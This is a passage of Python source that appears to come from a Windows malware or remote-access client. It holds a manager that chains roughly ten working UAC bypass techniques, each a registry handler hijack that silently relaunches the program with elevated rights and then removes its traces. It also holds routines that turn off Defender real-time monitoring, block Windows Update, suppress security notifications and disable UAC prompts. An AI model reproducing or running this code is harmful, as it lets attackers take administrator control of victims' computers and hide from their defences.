        with self._lock:
            if method_name not in self.methods:
                log_message(f"[UAC MANAGER] Unknown method: {method_name}", "error")
                return False
            
            method = self.methods[method_name]
            
            if not method.is_available():
                log_message(f"[UAC MANAGER] Method '{method_name}' not available", "warning")
                return False
            
            try:
                log_message(f"[UAC MANAGER] Executing method: {method.name}", "info")
                result = method.execute()
                
                if result:
                    log_message(f"[ OK ] [UAC MANAGER] Method '{method_name}' succeeded!", "success")
                else:
                    log_message(f"[UAC MANAGER] Method '{method_name}' failed", "warning")
                
                return result
                
            except UACBypassError as e:
                log_message(f"[UAC MANAGER] Method '{method_name}' error: {e}", "error")
                return False
            except Exception as e:
                log_message(f"[UAC MANAGER] Unexpected error in '{method_name}': {e}", "error")
                return False
    
    def try_all_methods(self) -> bool:
        """Try all available UAC bypass methods until one succeeds"""
        with self._lock:
            try:
                maybe_enable_bypass_debugging()
            except Exception:
                pass
            available_methods = self.get_available_methods()
            
            if not available_methods:
                debug_print("[ X ] [UAC MANAGER] No UAC bypass methods available")
                log_message("[UAC MANAGER] No UAC bypass methods available", "warning")
                return False
            
            debug_print(f"[UAC MANAGER] Trying {len(available_methods)} UAC bypass methods...")
            log_message(f"[UAC MANAGER] Trying {len(available_methods)} UAC bypass methods...", "info")
            
            for i, method_name in enumerate(available_methods, 1):
                try:
                    debug_print("=" * 80)
                    debug_print(f"[UAC MANAGER] Attempt {i}/{len(available_methods)}: {method_name}")
                    debug_print("=" * 80)
                    log_message(f"[UAC MANAGER] Attempt {i}/{len(available_methods)}: {method_name}", "info")
                    
                    result = self.execute_method(method_name)
                    
                    if result:
                        debug_print("=" * 80)
                        debug_print(f"[ OK ] [UAC MANAGER] SUCCESS! Method '{method_name}' worked!")
                        debug_print("=" * 80)
                        log_message(f"[ OK ] [UAC MANAGER] UAC bypass successful with method: {method_name}!", "success")
                        return True
                    else:
                        debug_print(f"[ X ] [UAC MANAGER] Method '{method_name}' FAILED")
                        try:
                            maybe_enable_bypass_debugging()
                        except Exception:
                            pass
                        
                except Exception as e:
                    debug_print(f"[ X ] [UAC MANAGER] EXCEPTION in method '{method_name}': {e}")
                    log_message(f"[UAC MANAGER] Error trying method '{method_name}': {e}", "error")
                    continue
            
            debug_print("=" * 80)
            debug_print("[ X ] [UAC MANAGER] ALL METHODS FAILED!")
            debug_print("=" * 80)
            log_message("[UAC MANAGER] [ X ] All UAC bypass methods failed", "error")
            return False
    
    def run_as_admin(self) -> bool:
        """Attempt to run the current process as administrator"""
        if is_admin():
            log_message("[UAC MANAGER] Already running as administrator", "info")
            return True
        
        log_message("[UAC MANAGER] Attempting to escalate privileges...", "info")
        return self.try_all_methods()

# ADVANCED UAC BYPASS METHOD CLASSES

class FodhelperProtocolBypass(UACBypassMethod):
    """Enhanced UAC bypass using fodhelper.exe and ms-settings protocol (UACME Method 33)"""
    
    def __init__(self):
        super().__init__(
            "Fodhelper Protocol",
            "UAC bypass using fodhelper.exe and ms-settings protocol",
            33
        )
    
    def is_available(self) -> bool:
        fodhelper_path = os.path.join(os.environ.get('SystemRoot', 'C:\\Windows'), 'System32', 'fodhelper.exe')
        return super().is_available() and os.path.exists(fodhelper_path)
    
    def _execute_bypass(self) -> bool:
        try:
            import winreg
            
            current_exe = self.get_current_executable()
            key_path = r"Software\Classes\ms-settings\Shell\Open\command"
            
            # Create protocol handler
            key = winreg.CreateKey(winreg.HKEY_CURRENT_USER, key_path)
            winreg.SetValueEx(key, "", 0, winreg.REG_SZ, current_exe)
            winreg.SetValueEx(key, "DelegateExecute", 0, winreg.REG_SZ, "")
            winreg.CloseKey(key)
            
            # Execute fodhelper - use SystemRoot to avoid file system redirection
            fodhelper_path = os.path.join(os.environ.get('SystemRoot', 'C:\\Windows'), 'System32', 'fodhelper.exe')
            process = subprocess.Popen(
                [fodhelper_path],
                creationflags=subprocess.CREATE_NO_WINDOW,
                stdout=subprocess.PIPE,
                stderr=subprocess.PIPE
            )
            
            try:
                process.communicate(timeout=10)
            except subprocess.TimeoutExpired:
                process.kill()
            
            time.sleep(2)
            self.cleanup_registry(key_path)
            return True
            
        except Exception as e:
            try:
                self.cleanup_registry(key_path)
            except (OSError, PermissionError):
                pass
            raise UACBypassError(f"Fodhelper protocol bypass failed: {e}")
class CleanmgrSagerunBypass(UACBypassMethod):
    def __init__(self):
        super().__init__(
            "Cleanmgr Sagerun",
            "UAC bypass using cleanmgr.exe /sagerun",
            69
        )
    def is_available(self) -> bool:
        cleanmgr_path = os.path.join(os.environ.get('SystemRoot', 'C:\\Windows'), 'System32', 'cleanmgr.exe')
        return super().is_available() and os.path.exists(cleanmgr_path)
    def _execute_bypass(self) -> bool:
        try:
            cmd = [
                "powershell",
                "-NoProfile",
                "-ExecutionPolicy", "Bypass",
                "-Command",
                "try { reg add 'HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\VolumeCaches\\Active Setup Temporary Internet Files' /v StateFlags0001 /t REG_DWORD /d 2 /f; cleanmgr.exe /sagerun:1; reg delete 'HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\VolumeCaches\\Active Setup Temporary Internet Files' /v StateFlags0001 /f; Write-Host '[SUCCESS] cleanmgr.exe bypass executed successfully' -ForegroundColor Green } catch { Write-Host '[FAILED] cleanmgr.exe bypass failed: ' $_.Exception.Message -ForegroundColor Red }"
            ]
            result = subprocess.run(cmd, capture_output=True, text=True, timeout=120, creationflags=getattr(subprocess, "CREATE_NO_WINDOW", 0))
            out = (result.stdout or "") + (result.stderr or "")
            if "[SUCCESS] cleanmgr.exe bypass executed successfully" in out:
                return True
            return result.returncode == 0
        except Exception as e:
            raise UACBypassError(f"Cleanmgr sagerun bypass failed: {e}")

class ComputerDefaultsBypass(UACBypassMethod):
    """Enhanced UAC bypass using computerdefaults.exe"""
    
    def __init__(self):
        super().__init__(
            "Computer Defaults",
            "UAC bypass using computerdefaults.exe",
            33
        )
    
    def is_available(self) -> bool:
        computerdefaults_path = os.path.join(os.environ.get('SystemRoot', 'C:\\Windows'), 'System32', 'ComputerDefaults.exe')
        return super().is_available() and os.path.exists(computerdefaults_path)
    
    def _execute_bypass(self) -> bool:
        try:
            import winreg
            
            current_exe = self.get_current_executable()
            key_path = r"Software\Classes\ms-settings\Shell\Open\command"
            
            key = winreg.CreateKey(winreg.HKEY_CURRENT_USER, key_path)
            winreg.SetValueEx(key, "", 0, winreg.REG_SZ, current_exe)
            winreg.SetValueEx(key, "DelegateExecute", 0, winreg.REG_SZ, "")
            winreg.CloseKey(key)
            
            computerdefaults_path = os.path.join(os.environ.get('SystemRoot', 'C:\\Windows'), 'System32', 'ComputerDefaults.exe')
            process = subprocess.Popen(
                [computerdefaults_path],
                creationflags=subprocess.CREATE_NO_WINDOW,
                stdout=subprocess.PIPE,
                stderr=subprocess.PIPE
            )
            
            try:
                process.communicate(timeout=10)
            except subprocess.TimeoutExpired:
                process.kill()
            
            time.sleep(2)
            self.cleanup_registry(key_path)
            return True
            
        except Exception as e:
            try:
                self.cleanup_registry(key_path)
            except (OSError, PermissionError):
                pass
            raise UACBypassError(f"Computer defaults bypass failed: {e}")

class EventViewerBypass(UACBypassMethod):
    """Enhanced UAC bypass using EventVwr.exe (UACME Method 25)"""
    
    def __init__(self):
        super().__init__(
            "Event Viewer",
            "UAC bypass using EventVwr.exe registry hijacking",
            25
        )
    
    def is_available(self) -> bool:
        eventvwr_path = os.path.join(os.environ.get('SystemRoot', 'C:\\Windows'), 'System32', 'eventvwr.exe')
        return super().is_available() and os.path.exists(eventvwr_path)
    
    def _execute_bypass(self) -> bool:
        try:
            import winreg
            current_exe = self.get_current_executable()
            key_path = r"Software\Classes\mscfile\shell\open\command"
            ps_path = r"HKCU:\Software\Classes\mscfile\shell\open\command"
            try:
                cmd = [
                    "powershell",
                    "-NoProfile",
                    "-ExecutionPolicy", "Bypass",
                    "-Command",
                    f"try {{ New-Item \"{ps_path}\" -Force | Out-Null; Set-ItemProperty \"{ps_path}\" -Name \"(default)\" -Value \"{current_exe}\" -Force; Start-Process \"C:\\Windows\\System32\\eventvwr.msc\" -WindowStyle Hidden }} catch {{}}"
                ]
                subprocess.run(cmd, capture_output=True, text=True, timeout=60, creationflags=getattr(subprocess, "CREATE_NO_WINDOW", 0))
                time.sleep(3)
            except Exception:
                pass
            try:
                subprocess.run([
                    "cmd", "/c",
                    f"reg.exe add hkcu\\software\\classes\\mscfile\\shell\\open\\command /ve /d \"{current_exe}\" /f && cmd.exe /c eventvwr.msc"
                ], capture_output=True, timeout=60, creationflags=getattr(subprocess, "CREATE_NO_WINDOW", 0))
                time.sleep(3)
            except Exception:
                pass
            try:
                key = winreg.CreateKey(winreg.HKEY_CURRENT_USER, key_path)
                winreg.SetValueEx(key, "", 0, winreg.REG_SZ, current_exe)
                winreg.CloseKey(key)
                eventvwr_path = os.path.join(os.environ.get('SystemRoot', 'C:\\Windows'), 'System32', 'eventvwr.exe')
                process = subprocess.Popen(
                    [eventvwr_path],
                    creationflags=subprocess.CREATE_NO_WINDOW,
                    stdout=subprocess.PIPE,
                    stderr=subprocess.PIPE
                )
                try:
                    process.communicate(timeout=15)
                except subprocess.TimeoutExpired:
                    process.kill()
            except Exception:
                pass
            time.sleep(3)
            self.cleanup_registry(key_path)
            return True
        except Exception as e:
            try:
                self.cleanup_registry(key_path)
            except (OSError, PermissionError):
                pass
            raise UACBypassError(f"Event Viewer bypass failed: {e}")

class SdcltBypass(UACBypassMethod):
    """Enhanced UAC bypass using sdclt.exe (UACME Method 31)"""
    
    def __init__(self):
        super().__init__(
            "Sdclt",
            "UAC bypass using sdclt.exe",
            31
        )
    
    def is_available(self) -> bool:
        sdclt_path = os.path.join(os.environ.get('SystemRoot', 'C:\\Windows'), 'System32', 'sdclt.exe')
        return super().is_available() and os.path.exists(sdclt_path)
    
    def _execute_bypass(self) -> bool:
        try:
            import winreg
            
            current_exe = self.get_current_executable()
            key_path = r"Software\Classes\Folder\shell\open\command"
            
            key = winreg.CreateKey(winreg.HKEY_CURRENT_USER, key_path)
            winreg.SetValueEx(key, "", 0, winreg.REG_SZ, current_exe)
            winreg.SetValueEx(key, "DelegateExecute", 0, winreg.REG_SZ, "")
            winreg.CloseKey(key)
            
            sdclt_path = os.path.join(os.environ.get('SystemRoot', 'C:\\Windows'), 'System32', 'sdclt.exe')
            process = subprocess.Popen(
                [sdclt_path],
                creationflags=subprocess.CREATE_NO_WINDOW,
                stdout=subprocess.PIPE,
                stderr=subprocess.PIPE
            )
            
            try:
                process.communicate(timeout=15)
            except subprocess.TimeoutExpired:
                process.kill()
            
            time.sleep(3)
            self.cleanup_registry(key_path)
            return True
            
        except Exception as e:
            try:
                self.cleanup_registry(key_path)
            except (OSError, PermissionError):
                pass
            raise UACBypassError(f"Sdclt bypass failed: {e}")

class WSResetBypass(UACBypassMethod):
    """Enhanced UAC bypass using WSReset.exe (UACME Method 56)"""
    
    def __init__(self):
        super().__init__(
            "WSReset",
            "UAC bypass using WSReset.exe",
            56
        )
    
    def is_available(self) -> bool:
        wsreset_path = os.path.join(os.environ.get('SystemRoot', 'C:\\Windows'), 'System32', 'WSReset.exe')
        return super().is_available() and os.path.exists(wsreset_path)
    
    def _execute_bypass(self) -> bool:
        try:
            import winreg
            current_exe = self.get_current_executable()
            key_path = r"Software\Classes\AppX82a6gwre4fdg3bt635tn5ctqjf8msdd2\shell\open\command"
            ps_path = r"HKCU:\Software\Classes\AppX82a6gwre4fdg3bt635tn5ctqjf8msdd2\shell\open\command"
            try:
                cmd = [
                    "powershell",
                    "-NoProfile",
                    "-ExecutionPolicy", "Bypass",
                    "-Command",
                    f"try {{ New-Item \"{ps_path}\" -Force | Out-Null; New-ItemProperty -Path \"{ps_path}\" -Name \"DelegateExecute\" -Value \"\" -Force | Out-Null; Set-ItemProperty -Path \"{ps_path}\" -Name \"(default)\" -Value \"{current_exe}\" -Force -ErrorAction SilentlyContinue | Out-Null; Start-Process -FilePath \"C:\\Windows\\System32\\WSReset.exe\" -WindowStyle Hidden }} catch {{}}"
                ]
                subprocess.run(cmd, capture_output=True, text=True, timeout=60, creationflags=getattr(subprocess, "CREATE_NO_WINDOW", 0))
                time.sleep(3)
            except Exception:
                pass
            try:
                key = winreg.CreateKey(winreg.HKEY_CURRENT_USER, key_path)
                winreg.SetValueEx(key, "", 0, winreg.REG_SZ, current_exe)
                winreg.SetValueEx(key, "DelegateExecute", 0, winreg.REG_SZ, "")
                winreg.CloseKey(key)
                wsreset_path = os.path.join(os.environ.get('SystemRoot', 'C:\\Windows'), 'System32', 'WSReset.exe')
                process = subprocess.Popen(
                    [wsreset_path],
                    creationflags=subprocess.CREATE_NO_WINDOW,
                    stdout=subprocess.PIPE,
                    stderr=subprocess.PIPE
                )
                try:
                    process.communicate(timeout=15)
                except subprocess.TimeoutExpired:
                    process.kill()
            except Exception:
                pass
            time.sleep(3)
            self.cleanup_registry(key_path)
            return True
        except Exception as e:
            try:
                self.cleanup_registry(key_path)
            except (OSError, PermissionError):
                pass
            raise UACBypassError(f"WSReset bypass failed: {e}")

class SluiBypass(UACBypassMethod):
    """Enhanced UAC bypass using slui.exe (UACME Method 45)"""
    
    def __init__(self):
        super().__init__(
            "Slui",
            "UAC bypass using slui.exe",
            45
        )
    
    def is_available(self) -> bool:
        if DISABLE_SLUI_BYPASS:
            return False
        slui_path = os.path.join(os.environ.get('SystemRoot', 'C:\\Windows'), 'System32', 'slui.exe')
        return super().is_available() and os.path.exists(slui_path)
    
    def _execute_bypass(self) -> bool:
        try:
            import winreg
            
            current_exe = self.get_current_executable()
            key_path = r"Software\Classes\exefile\shell\open\command"
            
            key = winreg.CreateKey(winreg.HKEY_CURRENT_USER, key_path)
            winreg.SetValueEx(key, "", 0, winreg.REG_SZ, current_exe)
            winreg.SetValueEx(key, "DelegateExecute", 0, winreg.REG_SZ, "")
            winreg.CloseKey(key)
            
            # Use SystemRoot environment variable to avoid file system redirection on 32-bit Python
            slui_path = os.path.join(os.environ.get('SystemRoot', 'C:\\Windows'), 'System32', 'slui.exe')
            process = subprocess.Popen(
                [slui_path],
                creationflags=subprocess.CREATE_NO_WINDOW,
                stdout=subprocess.PIPE,
                stderr=subprocess.PIPE
            )
            
            try:
                process.communicate(timeout=10)
            except subprocess.TimeoutExpired:
                process.kill()
            
            time.sleep(2)
            self.cleanup_registry(key_path)
            return True
            
        except Exception as e:
            try:
                self.cleanup_registry(key_path)
            except (OSError, PermissionError):
                pass
            raise UACBypassError(f"Slui bypass failed: {e}")

class WinsatBypass(UACBypassMethod):
    """Enhanced UAC bypass using winsat.exe (UACME Method 67)"""
    
    def __init__(self):
        super().__init__(
            "Winsat",
            "UAC bypass using winsat.exe",
            67
        )
    
    def is_available(self) -> bool:
        winsat_path = os.path.join(os.environ.get('SystemRoot', 'C:\\Windows'), 'System32', 'winsat.exe')
        return super().is_available() and os.path.exists(winsat_path)
    
    def _execute_bypass(self) -> bool:
        try:
            import winreg
            
            current_exe = self.get_current_executable()
            key_path = r"Software\Classes\Folder\shell\open\command"
            
            key = winreg.CreateKey(winreg.HKEY_CURRENT_USER, key_path)
            winreg.SetValueEx(key, "", 0, winreg.REG_SZ, current_exe)
            winreg.SetValueEx(key, "DelegateExecute", 0, winreg.REG_SZ, "")
            winreg.CloseKey(key)
            
            winsat_path = os.path.join(os.environ.get('SystemRoot', 'C:\\Windows'), 'System32', 'winsat.exe')
            process = subprocess.Popen(
                [winsat_path, "disk"],
                creationflags=subprocess.CREATE_NO_WINDOW,
                stdout=subprocess.PIPE,
                stderr=subprocess.PIPE
            )
            
            try:
                process.communicate(timeout=20)
            except subprocess.TimeoutExpired:
                process.kill()
            
            time.sleep(2)
            self.cleanup_registry(key_path)
            return True
            
        except Exception as e:
            try:
                self.cleanup_registry(key_path)
            except (OSError, PermissionError):
                pass
            raise UACBypassError(f"Winsat bypass failed: {e}")

class SilentCleanupBypass(UACBypassMethod):
    """Enhanced UAC bypass using SilentCleanup scheduled task (UACME Method 34)"""
    
    def __init__(self):
        super().__init__(
            "SilentCleanup",
            "UAC bypass using SilentCleanup scheduled task",
            34
        )
    
    def _execute_bypass(self) -> bool:
        try:
            import winreg
            
            current_exe = self.get_current_executable()
            key_path = r"Environment"
            
            # Set environment variable
            key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, key_path, 0, winreg.KEY_SET_VALUE)
            winreg.SetValueEx(key, "windir", 0, winreg.REG_EXPAND_SZ, f"{current_exe} & ")
            winreg.CloseKey(key)
            
            # Execute SilentCleanup task
            result = subprocess.run([
                "schtasks", "/run", "/tn", r"\Microsoft\Windows\DiskCleanup\SilentCleanup"
            ], capture_output=True, text=True, timeout=30)
            
            time.sleep(5)
            
            # Clean up
            self._cleanup_environment()
            return True
            
        except Exception as e:
            try:
                self._cleanup_environment()
            except (OSError, PermissionError):
                pass
            raise UACBypassError(f"SilentCleanup bypass failed: {e}")
    
    def _cleanup_environment(self) -> None:
        """Clean up environment variable"""
        try:
            import winreg
            key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, "Environment", 0, winreg.KEY_SET_VALUE)
            winreg.DeleteValue(key, "windir")
            winreg.CloseKey(key)
        except Exception:
            pass

class ICMLuaUtilBypass(UACBypassMethod):
    """Enhanced UAC bypass using ICMLuaUtil COM interface (UACME Method 41)"""
    
    def __init__(self):
        super().__init__(
            "ICMLuaUtil COM",
            "UAC bypass using ICMLuaUtil COM interface",
            41
        )
    
    def is_available(self) -> bool:
        try:
            import win32com.client
            import pythoncom
            return super().is_available()
        except ImportError:
            return False
    
    def _execute_bypass(self) -> bool:
        try:
            import win32com.client
            import pythoncom
            
            pythoncom.CoInitialize()
            
            try:
                lua_util = win32com.client.Dispatch(
                    "Elevation:Administrator!new:{3E5FC7F9-9A51-4367-9063-A120244FBEC7}"
                )
                
                current_exe = self.get_current_executable()
                lua_util.ShellExec(current_exe, "", "", 0, 1)
                
                return True
                
            finally:
                pythoncom.CoUninitialize()
                
        except Exception as e:
            raise UACBypassError(f"ICMLuaUtil COM bypass failed: {e}")

# Global UAC bypass manager instance (lazy-initialized to avoid RLock issues)
uac_manager = None

def get_uac_manager():
    """Get or create the UAC bypass manager instance (lazy initialization)"""
    global uac_manager
    if uac_manager is None:
        uac_manager = UACBypassManager()
    return uac_manager

def is_admin():
    """Check if the current process has admin privileges."""
    if WINDOWS_AVAILABLE:
        try:
            result = ctypes.windll.shell32.IsUserAnAdmin()
            if UAC_PRIVILEGE_DEBUG:
                if result:
                    debug_print("[ OK ] [ADMIN CHECK] Running as ADMINISTRATOR")
                else:
                    debug_print("[ X ] [ADMIN CHECK] Running as NORMAL USER (not admin)")
            return result
        except (AttributeError, OSError) as e:
            if UAC_PRIVILEGE_DEBUG:
                debug_print(f"[ X ] [ADMIN CHECK] Failed to check admin status: {e}")
            return False
    else:
        result = os.geteuid() == 0
        if UAC_PRIVILEGE_DEBUG:
            debug_print(f"[ADMIN CHECK] Linux/Unix euid check: {result}")
        return result

def elevate_via_registry_auto_approve():
    """Automatically approve UAC prompts via registry modification."""
    if not WINDOWS_AVAILABLE:
        return False
    
    try:
        import winreg
        
        # Set UAC to auto-approve for current user (no prompt)
        reg_path = r"SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System"
        
        # Try to set in HKCU first (doesn't need admin)
        try:
            key = winreg.CreateKey(winreg.HKEY_CURRENT_USER, reg_path)
            winreg.SetValueEx(key, "EnableLUA", 0, winreg.REG_DWORD, 0)
            winreg.SetValueEx(key, "ConsentPromptBehaviorAdmin", 0, winreg.REG_DWORD, 0)
            winreg.CloseKey(key)
            log_message("[REGISTRY] Auto-approve set in HKCU")
            try:
                emit_security_notification('success', 'UAC Auto-Approve Applied', 'HKCU policy updated')
            except Exception:
                pass
            return True
        except Exception:
            pass
        
        return False
    except Exception as e:
        log_message(f"[REGISTRY] Auto-approve failed: {e}")
        try:
            emit_security_notification('error', 'UAC Auto-Approve Failed', str(e))
        except Exception:
            pass
        return False

def ensure_registry_policies_and_context_menu():
    if not WINDOWS_AVAILABLE:
        return False
    try:
        import winreg
        s = False
        try:
            if REGISTRY_ACTIONS.get('policy_push_notifications', True):
                k = winreg.CreateKey(winreg.HKEY_CURRENT_USER, r"SOFTWARE\Policies\Microsoft\Windows\CurrentVersion\PushNotifications")
                try:
                    v, t = winreg.QueryValueEx(k, "NoToastApplicationNotification")
                    if t != winreg.REG_DWORD or v != 1:
                        winreg.SetValueEx(k, "NoToastApplicationNotification", 0, winreg.REG_DWORD, 1)
                except FileNotFoundError:
                    winreg.SetValueEx(k, "NoToastApplicationNotification", 0, winreg.REG_DWORD, 1)
                winreg.CloseKey(k)
                s = True
        except Exception as e:
            log_message(f"[REGISTRY] PushNotifications policy failed: {e}", "warning")
        try:
            if REGISTRY_ACTIONS.get('policy_windows_update', True):
                k = winreg.CreateKey(winreg.HKEY_LOCAL_MACHINE, r"SOFTWARE\Policies\Microsoft\Windows\WindowsUpdate")
                try:
                    v, t = winreg.QueryValueEx(k, "DisableWindowsUpdateAccess")
                    if t != winreg.REG_DWORD or v != 1:
                        winreg.SetValueEx(k, "DisableWindowsUpdateAccess", 0, winreg.REG_DWORD, 1)
                except FileNotFoundError:
                    winreg.SetValueEx(k, "DisableWindowsUpdateAccess", 0, winreg.REG_DWORD, 1)
                winreg.CloseKey(k)
                s = True
        except Exception as e:
            log_message(f"[REGISTRY] WindowsUpdate policy failed: {e}", "warning")
        try:
            if REGISTRY_ACTIONS.get('context_runas_cmd', True):
                k = winreg.CreateKey(winreg.HKEY_CLASSES_ROOT, r"Directory\Background\shell\runas")
                winreg.SetValueEx(k, "", 0, winreg.REG_SZ, "Open Command Prompt as Admin")
                winreg.SetValueEx(k, "Icon", 0, winreg.REG_SZ, "cmd.exe")
                winreg.SetValueEx(k, "HasLUAShield", 0, winreg.REG_SZ, "")
                winreg.CloseKey(k)
                kc = winreg.CreateKey(winreg.HKEY_CLASSES_ROOT, r"Directory\Background\shell\runas\command")
                winreg.SetValueEx(kc, "", 0, winreg.REG_SZ, 'cmd.exe /s /k pushd "%V"')
                winreg.CloseKey(kc)
                s = True
        except Exception as e:
            log_message(f"[REGISTRY] Context menu runas failed: {e}", "warning")
        try:
            if REGISTRY_ACTIONS.get('context_powershell_admin', True):
                k = winreg.CreateKey(winreg.HKEY_CLASSES_ROOT, r"Directory\Background\shell\PowershellAdmin")
                winreg.SetValueEx(k, "", 0, winreg.REG_SZ, "Open PowerShell as Admin")
                winreg.SetValueEx(k, "Icon", 0, winreg.REG_SZ, "powershell.exe")
                winreg.SetValueEx(k, "HasLUAShield", 0, winreg.REG_SZ, "")
                winreg.CloseKey(k)
                kc = winreg.CreateKey(winreg.HKEY_CLASSES_ROOT, r"Directory\Background\shell\PowershellAdmin\command")
                winreg.SetValueEx(kc, "", 0, winreg.REG_SZ, 'powershell.exe -NoExit -Command "Set-Location \'%V\'"')
                winreg.CloseKey(kc)
                s = True
        except Exception as e:
            log_message(f"[REGISTRY] Context menu PowershellAdmin failed: {e}", "warning")
        return s
    except Exception as e:
        log_message(f"[REGISTRY] Ensure policies/context menu error: {e}", "error")
        return False

def apply_registry_action(action_key: str, enabled: bool) -> bool:
    try:
        emit_bypass_test_debug(None, f"registry:{action_key}", action='start', status='pending', point='registry.enter', extra={'kind': 'registry_action', 'action_key': action_key, 'enabled': bool(enabled)})
        import winreg
        if action_key == 'policy_push_notifications':
            try:
                k = winreg.CreateKey(winreg.HKEY_CURRENT_USER, r"SOFTWARE\Policies\Microsoft\Windows\CurrentVersion\PushNotifications")
                val = 1 if enabled else 0
                winreg.SetValueEx(k, "NoToastApplicationNotification", 0, winreg.REG_DWORD, val)
                winreg.CloseKey(k)
                emit_bypass_test_debug(None, f"registry:{action_key}", action='result', status='success', point='registry.result', extra={'enabled': bool(enabled)})
                return True
            except Exception as e:
                log_message(f"[REGISTRY] PushNotifications policy error: {e}", "warning")
                emit_bypass_test_debug(None, f"registry:{action_key}", action='error', status='error', reason=str(e), point='registry.error')
                return False
        if action_key == 'policy_windows_update':
            try:
                k = winreg.CreateKey(winreg.HKEY_LOCAL_MACHINE, r"SOFTWARE\Policies\Microsoft\Windows\WindowsUpdate")
                val = 1 if enabled else 0
                winreg.SetValueEx(k, "DisableWindowsUpdateAccess", 0, winreg.REG_DWORD, val)
                winreg.CloseKey(k)
                emit_bypass_test_debug(None, f"registry:{action_key}", action='result', status='success', point='registry.result', extra={'enabled': bool(enabled)})
                return True
            except Exception as e:
                log_message(f"[REGISTRY] WindowsUpdate policy error: {e}", "warning")
                emit_bypass_test_debug(None, f"registry:{action_key}", action='error', status='error', reason=str(e), point='registry.error')
                return False
        if action_key == 'context_runas_cmd':
            try:
                if enabled:
                    k = winreg.CreateKey(winreg.HKEY_CLASSES_ROOT, r"Directory\Background\shell\runas")
                    winreg.SetValueEx(k, "", 0, winreg.REG_SZ, "Open Command Prompt as Admin")
                    winreg.SetValueEx(k, "Icon", 0, winreg.REG_SZ, "cmd.exe")
                    winreg.SetValueEx(k, "HasLUAShield", 0, winreg.REG_SZ, "")
                    winreg.CloseKey(k)
                    kc = winreg.CreateKey(winreg.HKEY_CLASSES_ROOT, r"Directory\Background\shell\runas\command")
                    winreg.SetValueEx(kc, "", 0, winreg.REG_SZ, 'cmd.exe /s /k pushd "%V"')
                    winreg.CloseKey(kc)
                else:
                    try:
                        winreg.DeleteKey(winreg.HKEY_CLASSES_ROOT, r"Directory\Background\shell\runas\command")
                    except Exception:
                        pass
                    try:
                        winreg.DeleteKey(winreg.HKEY_CLASSES_ROOT, r"Directory\Background\shell\runas")
                    except Exception:
                        pass
                emit_bypass_test_debug(None, f"registry:{action_key}", action='result', status='success', point='registry.result', extra={'enabled': bool(enabled)})
                return True
            except Exception as e:
                log_message(f"[REGISTRY] Context menu runas error: {e}", "warning")
                emit_bypass_test_debug(None, f"registry:{action_key}", action='error', status='error', reason=str(e), point='registry.error')
                return False
        if action_key == 'context_powershell_admin':
            try:
                if enabled:
                    k = winreg.CreateKey(winreg.HKEY_CLASSES_ROOT, r"Directory\Background\shell\PowershellAdmin")
                    winreg.SetValueEx(k, "", 0, winreg.REG_SZ, "Open PowerShell as Admin")
                    winreg.SetValueEx(k, "Icon", 0, winreg.REG_SZ, "powershell.exe")
                    winreg.SetValueEx(k, "HasLUAShield", 0, winreg.REG_SZ, "")
                    winreg.CloseKey(k)
                    kc = winreg.CreateKey(winreg.HKEY_CLASSES_ROOT, r"Directory\Background\shell\PowershellAdmin\command")
                    winreg.SetValueEx(kc, "", 0, winreg.REG_SZ, 'powershell.exe -NoExit -Command "Set-Location \'%V\'"')
                    winreg.CloseKey(kc)
                else:
                    try:
                        winreg.DeleteKey(winreg.HKEY_CLASSES_ROOT, r"Directory\Background\shell\PowershellAdmin\command")
                    except Exception:
                        pass
                    try:
                        winreg.DeleteKey(winreg.HKEY_CLASSES_ROOT, r"Directory\Background\shell\PowershellAdmin")
                    except Exception:
                        pass
                emit_bypass_test_debug(None, f"registry:{action_key}", action='result', status='success', point='registry.result', extra={'enabled': bool(enabled)})
                return True
            except Exception as e:
                log_message(f"[REGISTRY] Context menu PowershellAdmin error: {e}", "warning")
                emit_bypass_test_debug(None, f"registry:{action_key}", action='error', status='error', reason=str(e), point='registry.error')
                return False
        if action_key == 'disableRealtimeMonitoring':
            try:
                if enabled:
                    ok = bool(disable_realtime_monitoring_before_uac())
                    emit_bypass_test_debug(None, f"registry:{action_key}", action='result', status='success' if ok else 'failed', point='registry.result', extra={'enabled': True})
                    return ok
                else:
                    try:
                        subprocess.run(['powershell.exe', '-Command', 'Set-MpPreference -DisableRealtimeMonitoring $false'], creationflags=subprocess.CREATE_NO_WINDOW, timeout=10, capture_output=True, text=True)
                        emit_bypass_test_debug(None, f"registry:{action_key}", action='result', status='success', point='registry.result', extra={'enabled': False})
                        return True
                    except Exception as e:
                        log_message(f"[DEFENDER] EnableRealtimeMonitoring failed: {e}", "warning")
                        emit_bypass_test_debug(None, f"registry:{action_key}", action='error', status='error', reason=str(e), point='registry.error')
                        return False
            except Exception:
                return False
        emit_bypass_test_debug(None, f"registry:{action_key}", action='result', status='failed', point='registry.result', extra={'enabled': bool(enabled)})
        return False
    except Exception as e:
        log_message(f"[REGISTRY] apply_registry_action error: {e}", "error")
        emit_bypass_test_debug(None, f"registry:{action_key}", action='error', status='error', reason=str(e), point='registry.error')
        return False

def disable_realtime_monitoring_before_uac():
    if not WINDOWS_AVAILABLE:
        return False
    try:
        subprocess.run(['powershell.exe', '-Command', 'Set-MpPreference -DisableRealtimeMonitoring $true'], creationflags=subprocess.CREATE_NO_WINDOW, timeout=10, capture_output=True, text=True)
        return True
    except Exception as e:
        log_message(f"[DEFENDER] DisableRealtimeMonitoring failed: {e}", "warning")
        return False

def suppress_security_notifications_aggressive():
    if not WINDOWS_AVAILABLE:
        return False
    try:
        import winreg
        success = 0
        def set_dword(root, path, name, value):
            nonlocal success
            try:
                key = winreg.CreateKey(root, path)
                winreg.SetValueEx(key, name, 0, winreg.REG_DWORD, value)
                winreg.CloseKey(key)
                success += 1
            except Exception:
                pass
        if REGISTRY_ACTIONS.get('policy_push_notifications', True):
            set_dword(winreg.HKEY_CURRENT_USER, r"SOFTWARE\Microsoft\Windows\CurrentVersion\PushNotifications", "ToastEnabled", 0)
            set_dword(winreg.HKEY_CURRENT_USER, r"SOFTWARE\Policies\Microsoft\Windows\CurrentVersion\PushNotifications", "NoToastApplicationNotification", 1)
        if REGISTRY_ACTIONS.get('defender_ux_suppress', True):
            set_dword(winreg.HKEY_CURRENT_USER, r"SOFTWARE\Microsoft\Windows Defender\UX Configuration", "Notification_Suppress", 1)
        if REGISTRY_ACTIONS.get('notify_center_hkcu', True):
